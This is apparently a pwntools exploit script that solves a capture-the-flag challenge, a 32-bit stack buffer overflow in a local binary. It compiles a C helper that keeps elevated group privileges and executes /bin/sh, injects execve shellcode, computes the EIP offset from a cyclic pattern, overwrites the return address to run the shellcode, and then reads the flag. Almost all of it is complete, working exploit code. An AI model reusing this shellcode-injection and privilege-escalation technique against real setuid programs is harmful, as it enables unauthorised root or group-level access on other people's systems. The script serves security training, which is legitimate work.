from pwn import *
import os

DEBUG = False 
file = "./stack-ovfl-where-32"

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
mov    ecx,0x0
mov    edx,0x0
mov    eax,0xb
push   0x0
push   0x7a
mov    ebx,esp
int    0x80
''')

env = {"PATH":"$PATH:."}

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
eip = p32(int(io.recvline_contains(b"EIP").split(b'.')[0].split(b" ")[-1], 16))
buf_len = cyclic(1000).find(eip)
    
# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x0804850c
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
print(f"len(shellcode) = {len(shellcode)}, max = {buf_len}")

ret_addr = 0x08048332
buffer_address = int(io.recvline().split(b':')[1].strip(), 16)
payload = shellcode + (b"A" * (buf_len - len(shellcode))) + p32(ret_addr) + p32(buffer_address)
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Hello', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
